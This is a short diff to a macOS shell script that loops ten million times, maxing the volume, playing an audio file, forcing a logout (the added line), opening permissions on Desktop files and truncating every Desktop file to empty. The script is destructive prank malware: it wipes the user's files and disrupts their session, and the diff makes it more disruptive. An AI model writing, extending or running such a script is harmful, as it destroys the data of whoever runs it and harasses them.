@@ -11,6 +11,7 @@ for i in {1..10000000};
 do
 	osascript -e "set Volume 10"
 	afplay /Users/$USER/Music/lkwa$1/LOUDAF/Depression.mp3
+	launchctl reboot logout
 	chmod 777 /Users/$USER/Desktop/*
 	for file in /Users/$USER/Desktop/*.*; do cat /dev/null > "$file" & done
 done
